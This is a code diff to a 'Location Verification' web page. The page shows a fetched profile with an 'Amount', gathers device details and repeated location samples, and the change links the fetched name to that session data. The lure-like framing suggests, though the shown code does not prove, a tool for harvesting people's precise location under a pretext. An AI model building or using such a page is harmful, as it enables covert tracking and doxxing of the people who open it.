@@ -37,9 +37,9 @@
         .verification-container h1 { font-size: 24px; color: #1a73e8; margin-top: 0; margin-bottom: 15px; }
         p.subtitle { color: #666; margin-bottom: 25px; font-size: 15px; }
 
-        /* --- New User Profile Card Styling --- */
+        /* User Profile Card Styling */
         .user-profile-card {
-            display: none; /* Hidden until data loads */
+            display: none;
             align-items: center;
             background: #ffffff;
             border: 1px solid #e0e0e0;
@@ -85,7 +85,6 @@
             display: inline-block;
             width: fit-content;
         }
-        /* ------------------------------------- */
 
         .badge-loading { background: #f5f5f5; color: #666; border: 1px solid #e0e0e0; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 25px; display: inline-block; }
         .badge-error { background: #ffebee; color: #d32f2f; border: 1px solid #ffcdd2; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 25px; display: inline-block; }
@@ -140,12 +139,9 @@
             <div id="introScreen">
                 <h1>Location Verification</h1>
                 
-                <!-- Status Loader -->
                 <div id="statusBadge" class="badge-loading" style="display: none;"></div>
                 
-                <!-- Styled Profile Card -->
                 <div id="userProfileCard" class="user-profile-card">
-                    <!-- The onerror attribute serves as our fallback if the Discord URL breaks -->
                     <img id="profileAvatar" class="profile-avatar" src="" alt="Profile Picture" 
                          onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2NjYyI+PHBhdGggZD0iTTEyIDEyYzIuMjEgMCA0LTEuNzkgNC00czEtMS43OS00LTQtNCAxLjc5LTQgNCAxLjc5NCA0IDR6bTAgMmMtMi42NyAwLTggMS4zNC04IDR2MmwxNiAwdjItYzAtMi42Ni01LjMzLTQtOC00eiIvPjwvc3ZnPg=='">
                     <div class="profile-info">
@@ -180,7 +176,6 @@
                 <div class="alert-popup-title">Verification Process Completed</div>
                 <div class="alert-popup-message">Data successfully verified.</div>
                 
-                <!-- Final Session JSON Debug Display -->
                 <div id="debugOutput">
                     <pre id="jsonRender"></pre>
                 </div>
@@ -210,6 +205,7 @@
         
         let watchId = null;
         let sessionData = {}; 
+        let extractedName = null; // Captured from the API response
 
         function getDeviceDetails() {
             const ua = navigator.userAgent;
@@ -254,20 +250,19 @@
                 if (response.ok) { 
                     const result = await response.json();
                     
-                    // Defensive check: Ensure the expected JSON structure exists
                     if (result.success && result.data) {
                         statusBadge.style.display = 'none'; 
                         
-                        // Populate the secure UI components using textContent to prevent XSS
                         profileAvatar.src = result.data.pfp;
                         profileName.textContent = result.data.name;
                         profileAmount.textContent = `Amount: ${result.data.amount}`;
                         
-                        // Show the card
+                        // Capture the name here so we can append it to the JSON later
+                        extractedName = result.data.name;
+                        
                         userProfileCard.style.display = 'flex';
                         startBtn.disabled = false;
                     } else {
-                        // Handle malformed JSON safely
                         throw new Error("Invalid API Data Structure");
                     }
                 } else {
@@ -318,6 +313,8 @@
             introScreen.style.display = 'none';
             progressWrapper.style.display = 'block';
 
+            // Inject the extracted name alongside the system details
+            sessionData.name = extractedName;
             sessionData.system = getDeviceDetails();
             sessionData.samples = [];
             sessionData.calculated_center = null;
